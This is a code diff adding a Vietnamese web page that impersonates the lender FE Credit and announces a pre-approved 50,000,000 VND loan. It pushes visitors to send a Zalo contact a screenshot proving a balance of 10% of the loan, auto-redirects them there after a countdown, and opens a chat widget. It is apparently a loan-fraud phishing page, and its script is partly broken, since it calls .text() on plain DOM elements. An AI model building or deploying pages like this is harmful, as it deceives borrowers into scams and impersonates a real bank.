@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Phê Duyệt Khoản Vay - FE Credit</title>
+  
+  <!-- SEO & Security -->
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="description" content="Khoản vay đã được phê duyệt. Liên hệ ngay để hoàn tất giải ngân." />
+  <meta name="theme-color" content="#00468F" />
+  
+  <!-- Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link rel="icon" href="https://fecredit.com.vn/favicon.ico" />
+  
+  <style>
+    :root {
+      --primary: #00468F;
+      --primary-dark: #003a78;
+      --accent: #2BB673;
+      --warning: #FFB703;
+      --bg: #F7FAFC;
+      --text: #1F2937;
+      --text-light: #6B7280;
+      --white: #FFFFFF;
+      --border: #E5E7EB;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+    }
+
+    /* Header */
+    .header {
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      color: var(--white);
+      padding: 2rem 1rem;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      width: 180px;
+      height: auto;
+      margin-bottom: 1.5rem;
+      filter: brightness(0) invert(1);
+    }
+
+    .success-icon {
+      width: 80px;
+      height: 80px;
+      background: var(--accent);
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 1rem;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+
+    .success-icon i {
+      font-size: 36px;
+      color: var(--white);
+    }
+
+    h1 {
+      font-size: 1.75rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .amount {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #d1fae5;
+      margin: 1rem 0;
+    }
+
+    /* Main Content */
+    .container {
+      max-width: 800px;
+      margin: -2rem auto 2rem;
+      padding: 0 1rem;
+    }
+
+    .card {
+      background: var(--white);
+      border-radius: 16px;
+      padding: 2rem;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      margin-bottom: 1.5rem;
+    }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 1.5rem;
+      padding-bottom: 1rem;
+      border-bottom: 2px solid var(--border);
+    }
+
+    .card-header h2 {
+      font-size: 1.25rem;
+      color: var(--primary);
+      font-weight: 600;
+    }
+
+    .card-header i {
+      font-size: 1.5rem;
+      color: var(--primary);
+    }
+
+    /* Alert Box */
+    .alert {
+      background: linear-gradient(135deg, #fff7ed 0%, #fed7aa 100%);
+      border-left: 4px solid var(--warning);
+      padding: 1.5rem;
+      border-radius: 12px;
+      margin-bottom: 1.5rem;
+    }
+
+    .alert h3 {
+      color: #92400e;
+      font-size: 1.1rem;
+      margin-bottom: 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .alert p {
+      color: #78350f;
+      margin: 0.5rem 0;
+    }
+
+    .alert strong {
+      color: #92400e;
+    }
+
+    /* Steps */
+    .steps {
+      display: grid;
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+
+    .step {
+      display: flex;
+      gap: 1rem;
+      align-items: center;
+      padding: 1rem;
+      background: #f9fafb;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+    }
+
+    .step-num {
+      width: 40px;
+      height: 40px;
+      background: var(--primary);
+      color: var(--white);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    .step-content h4 {
+      font-size: 1rem;
+      color: var(--primary);
+      margin-bottom: 0.25rem;
+    }
+
+    .step-content p {
+      font-size: 0.9rem;
+      color: var(--text-light);
+      margin: 0;
+    }
+
+    /* CTA Button */
+    .cta-section {
+      text-align: center;
+      margin: 2rem 0;
+    }
+
+    .btn-primary {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+      color: var(--white);
+      padding: 1rem 2.5rem;
+      border-radius: 50px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(0,70,143,0.3);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-primary::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: left 0.5s;
+    }
+
+    .btn-primary:hover::before {
+      left: 100%;
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0,70,143,0.4);
+    }
+
+    .countdown {
+      margin-top: 1rem;
+      color: var(--text-light);
+      font-size: 0.9rem;
+    }
+
+    .countdown strong {
+      color: var(--primary);
+      font-size: 1.1rem;
+    }
+
+    /* FAQ */
+    .faq-item {
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      margin-bottom: 0.75rem;
+      overflow: hidden;
+    }
+
+    .faq-question {
+      width: 100%;
+      background: #f9fafb;
+      border: none;
+      padding: 1rem 1.25rem;
+      text-align: left;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: background 0.2s;
+    }
+
+    .faq-question:hover {
+      background: #f3f4f6;
+    }
+
+    .faq-question i {
+      transition: transform 0.3s;
+    }
+
+    .faq-question[aria-expanded="true"] i {
+      transform: rotate(180deg);
+    }
+
+    .faq-answer {
+      display: none;
+      padding: 1rem 1.25rem;
+      background: var(--white);
+    }
+
+    .faq-answer.open {
+      display: block;
+    }
+
+    .faq-answer ul, .faq-answer ol {
+      margin-left: 1.5rem;
+      margin-top: 0.5rem;
+    }
+
+    .faq-answer li {
+      margin: 0.5rem 0;
+    }
+
+    /* Footer */
+    .footer {
+      background: #0a2540;
+      color: var(--white);
+      padding: 2rem 1rem;
+      text-align: center;
+      margin-top: 3rem;
+    }
+
+    .footer a {
+      color: #93c5fd;
+      text-decoration: none;
+      margin: 0 0.5rem;
+    }
+
+    .footer a:hover {
+      color: var(--white);
+    }
+
+    /* Responsive */
+    @media (max-width: 640px) {
+      h1 { font-size: 1.5rem; }
+      .amount { font-size: 1.25rem; }
+      .card { padding: 1.5rem; }
+      .btn-primary {
+        padding: 0.875rem 2rem;
+        font-size: 1rem;
+      }
+    }
+
+    /* Utility */
+    .text-center { text-align: center; }
+    .mt-1 { margin-top: 0.5rem; }
+    .mt-2 { margin-top: 1rem; }
+    .mb-2 { margin-bottom: 1rem; }
+  </style>
+</head>
+
+<body>
+  <!-- Header -->
+  <header class="header">
+    <img 
+      src="https://cdn.haitrieu.com/wp-content/uploads/2023/11/Logo-FECredit-Bank.png" 
+      alt="FE Credit" 
+      class="logo"
+      onerror="this.src='https://fecredit.com.vn/public/themes/fecredit/img/fecredit-logo.png'"
+    />
+    
+    <div class="success-icon">
+      <i class="fas fa-check"></i>
+    </div>
+    
+    <h1>🎉 Khoản vay đã được phê duyệt</h1>
+    <div class="amount" id="loanAmount">50,000,000 VND</div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="container">
+    <!-- Action Card -->
+    <div class="card">
+      <div class="card-header">
+        <i class="fas fa-clipboard-check"></i>
+        <h2>Bước cuối cùng: Hoàn tất giải ngân</h2>
+      </div>
+
+      <!-- Alert -->
+      <div class="alert">
+        <h3>
+          <i class="fas fa-exclamation-triangle"></i>
+          Liên hệ ngay để nhận tiền giải ngân
+        </h3>
+        <p>
+          <strong>Khoản vay đã được phê duyệt!</strong> Vui lòng liên hệ bộ phận thẩm định qua Zalo 
+          và cung cấp ảnh chụp màn hình số dư <strong id="requiredAmount">5,000,000 đ</strong> (10% số tiền vay).
+        </p>
+        <p><i class="fas fa-clock"></i> Thời gian xử lý: <strong>1-2 giờ</strong> làm việc</p>
+        <p><i class="fas fa-shield-check"></i> Hoàn toàn <strong>miễn phí</strong> - Không cần chuyển tiền</p>
+      </div>
+
+      <!-- Steps -->
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-content">
+            <h4>Chuẩn bị ảnh số dư</h4>
+            <p>Chụp màn hình số dư tài khoản (trong vòng 24h)</p>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-content">
+            <h4>Liên hệ Zalo</h4>
+            <p>Nhấn nút bên dưới để mở Zalo</p>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-content">
+            <h4>Gửi ảnh xác minh</h4>
+            <p>Gửi ảnh số dư cho chuyên viên thẩm định</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTA -->
+      <div class="cta-section">
+        <a 
+          href="https://zalo.me/3932037504673339016" 
+          target="_blank"
+          rel="noopener noreferrer"
+          class="btn-primary"
+          id="zaloBtn"
+        >
+          <i class="fab fa-telegram-plane"></i>
+          <span>Liên hệ thẩm định ngay</span>
+          <i class="fas fa-arrow-right"></i>
+        </a>
+        
+        <div class="countdown">
+          <i class="fas fa-clock"></i>
+          Tự động chuyển hướng sau <strong id="countdown">40</strong> giây
+        </div>
+
+        <div class="alert mt-2" style="background: #f0f9ff; border-left-color: #0ea5e9;">
+          <p style="color: #075985; margin: 0;">
+            <i class="fas fa-info-circle"></i>
+            <strong>Lưu ý:</strong> Hãy chuẩn bị ảnh số dư trước khi liên hệ
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- FAQ -->
+    <div class="card">
+      <div class="card-header">
+        <i class="fas fa-question-circle"></i>
+        <h2>Câu hỏi thường gặp</h2>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" aria-expanded="false">
+          <span>Làm thế nào để liên hệ thẩm định?</span>
+          <i class="fas fa-chevron-down"></i>
+        </button>
+        <div class="faq-answer">
+          <ol>
+            <li>Nhấn nút "Liên hệ thẩm định ngay"</li>
+            <li>Gửi tin nhắn: "Tôi cần thẩm định giải ngân"</li>
+            <li>Gửi ảnh số dư tài khoản</li>
+            <li>Chờ xác minh và nhận kết quả</li>
+          </ol>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" aria-expanded="false">
+          <span>Bao lâu thì giải ngân?</span>
+          <i class="fas fa-chevron-down"></i>
+        </button>
+        <div class="faq-answer">
+          <p><strong>1-2 giờ</strong> sau khi xác minh thành công (trong giờ làm việc)</p>
+          <ul>
+            <li>Ngoài giờ: Ngày làm việc tiếp theo</li>
+            <li>Cuối tuần: Thứ 2 tuần sau</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" aria-expanded="false">
+          <span>Có mất phí không?</span>
+          <i class="fas fa-chevron-down"></i>
+        </button>
+        <div class="faq-answer">
+          <p><strong>Hoàn toàn miễn phí.</strong> Không thu phí thẩm định hoặc giải ngân.</p>
+          <p style="color: #dc2626;"><strong>Cảnh báo:</strong> Nếu có người yêu cầu chuyển tiền, đó là lừa đảo!</p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div>
+      <a href="tel:19005555888"><i class="fas fa-phone"></i> Hotline: 1900 5555 888</a> |
+      <a href="mailto:support@fecredit.com.vn"><i class="fas fa-envelope"></i> support@fecredit.com.vn</a>
+    </div>
+    <p class="mt-2">© 2025 FE CREDIT BANK VIETNAM. ALL RIGHTS RESERVED.</p>
+  </footer>
+
+  <!-- Scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+  <script>
+    (function() {
+      'use strict';
+      
+      const $ = (sel) => document.querySelector(sel);
+      const $$ = (sel) => document.querySelectorAll(sel);
+      
+      // Format currency
+      const formatCurrency = (val) => {
+        const num = parseFloat(val);
+        return !isNaN(num) ? `${num.toLocaleString('en-US')} VND` : val;
+      };
+      
+      // Load user data
+      function loadData() {
+        try {
+          const raw = localStorage.getItem('userData');
+          if (!raw) return;
+          
+          let data;
+          try {
+            const bytes = CryptoJS.AES.decrypt(raw, 'fecredit-secret-key');
+            const decrypted = bytes.toString(CryptoJS.enc.Utf8);
+            data = decrypted ? JSON.parse(decrypted) : JSON.parse(raw);
+          } catch {
+            data = JSON.parse(raw);
+          }
+          
+          // Update UI
+          const loan = parseFloat(data.loanAmount);
+          if (!isNaN(loan)) {
+            $('#loanAmount').text(formatCurrency(loan));
+            $('#requiredAmount').text(formatCurrency(loan * 0.1, 'đ'));
+          }
+        } catch (err) {
+          // Error loading data
+        }
+      }
+      
+      // FAQ toggle
+      function initFAQ() {
+        $$('.faq-question').forEach(btn => {
+          btn.onclick = () => {
+            const open = btn.getAttribute('aria-expanded') === 'true';
+            btn.setAttribute('aria-expanded', !open);
+            btn.nextElementSibling.classList.toggle('open', !open);
+          };
+        });
+      }
+      
+      // Auto-redirect countdown
+      function initCountdown() {
+        const countdownEl = $('#countdown');
+        const zaloBtn = $('#zaloBtn');
+        const zaloUrl = 'https://zalo.me/3932037504673339016';
+        
+        let sec = 40;
+        const timer = setInterval(() => {
+          countdownEl.text(sec);
+          if (sec-- <= 0) {
+            clearInterval(timer);
+            window.location.href = zaloUrl;
+          }
+        }, 1000);
+        
+        zaloBtn.onclick = () => clearInterval(timer);
+      }
+      
+      // Init
+      document.addEventListener('DOMContentLoaded', () => {
+        loadData();
+        initFAQ();
+        initCountdown();
+      });
+    })();
+  </script>
+
+  <!-- Zalo Widget -->
+  <div 
+    class="zalo-chat-widget" 
+    data-oaid="3932037504673339016"
+    data-welcome-message="Chào anh chị, mình cần hỗ trợ thẩm định giải ngân!"
+    data-autopopup="5"
+  ></div>
+  <script src="https://sp.zalo.me/plugins/sdk.js"></script>
+</body>
+</html>
